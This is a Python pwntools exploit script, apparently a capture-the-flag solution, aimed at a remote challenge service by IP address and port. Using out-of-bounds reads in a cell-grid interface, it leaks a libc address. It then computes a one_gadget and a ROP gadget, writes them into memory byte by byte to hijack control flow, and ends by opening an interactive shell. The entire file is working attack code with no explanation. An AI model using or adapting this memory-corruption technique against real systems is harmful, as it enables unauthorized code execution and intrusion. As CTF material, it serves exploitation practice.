from pwn import *

#r = process('./challenge')
r = remote('195.201.127.177', 9999)
#r = remote('192.168.2.7', 1337)

def action(key):
	r.sendafter('<f>: RENDER SINGLE IMAGE\n', key)

def action_sequence(key_sequence):
	for key in key_sequence:
		action(key)

def current_cell():
	r.recvuntil('\nCURRENT CELL: ')
	r.recvuntil('m')
	return {'real': int(r.recvuntil(' -> ').split(' -> ')[0], 16), 'target': int(r.recvuntil('\n').split('\n')[0], 16)}

def change_cell_to(target):
	cell = current_cell()

	h_offset = ((target & 0xf0) - (cell['real'] & 0xf0)) >> 4
	if h_offset > 0:
		for _ in range(h_offset):
			action('1')
	elif h_offset < 0:
		for _ in range(-h_offset):
			action('2')

	l_offset = ((target & 0x0f) - (cell['real'] & 0x0f))
	if l_offset > 0:
		for _ in range(l_offset):
			action('+')
	elif l_offset < 0:
		for _ in range(-l_offset):
			action('-')

	return current_cell()


r.sendafter('PRESS ANY KEY TO CONTINUE; <q>: QUIT; <h>: TOGGLE HEADLESS...', 's')

action_sequence('dddd+++++++wwwww++++++')

'''
cell = current_cell()
print '0: ' + hex(cell['real']) + ' -> ' + hex(cell['target'])

for i in range(1, 200):
	action('w')
	cell = current_cell()
	if cell['real'] == 0x7f or cell['target'] == 0x7f:
		print str(i) + ': ' + hex(cell['real']) + ' -> ' + hex(cell['target'])
		action('a')
		cell = current_cell()
		print str(i) + ': ' + hex(cell['real']) + ' -> ' + hex(cell['target'])
		action('d')
'''

x = 5

for i in range(x):
	action('w')

leak = ''

leak += chr(current_cell()['real'])

for i in range(5):
	action('a')
	leak += chr(current_cell()['real'])

leak = leak[::-1] + '\x00\x00'

libc = u64(leak) - 0x3af96b + 0x1000

one_gadget = libc + 0x3f306
xor_rax_rax_ret = libc + 0x00000000000807f5

log.success('Libc @ ' + hex(libc))

for i in range(232 - x - 1):
	action('w')

for i in range(4):
	action('a')

change_cell_to((one_gadget & 0xff))

action('d')

change_cell_to((one_gadget & 0xff00) >> 8)

action('d')

change_cell_to((one_gadget & 0xff0000) >> 16)

action('d')

change_cell_to((one_gadget & 0xff000000) >> 24)

action('d')

change_cell_to((one_gadget & 0xff00000000) >> 32)

action('d')

action('f')

change_cell_to((one_gadget & 0xff0000000000) >> 40)

for i in range(3):
	action('a')

action('w')

#action('f')

change_cell_to((xor_rax_rax_ret & 0xff))

action('d')

change_cell_to((xor_rax_rax_ret & 0xff00) >> 8)

action('d')

change_cell_to((xor_rax_rax_ret & 0xff0000) >> 16)

action('d')

change_cell_to((xor_rax_rax_ret & 0xff000000) >> 24)

action('d')

change_cell_to((xor_rax_rax_ret & 0xff00000000) >> 32)

action('d')

change_cell_to((xor_rax_rax_ret & 0xff0000000000) >> 40)

r.interactive()

action('q')

r.interactive()

#ssssaaaaww++aw++
#dddd+++++++wwwwwaaaaaaaaa+++++++++
#dddd+++++++wwwww++++++wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
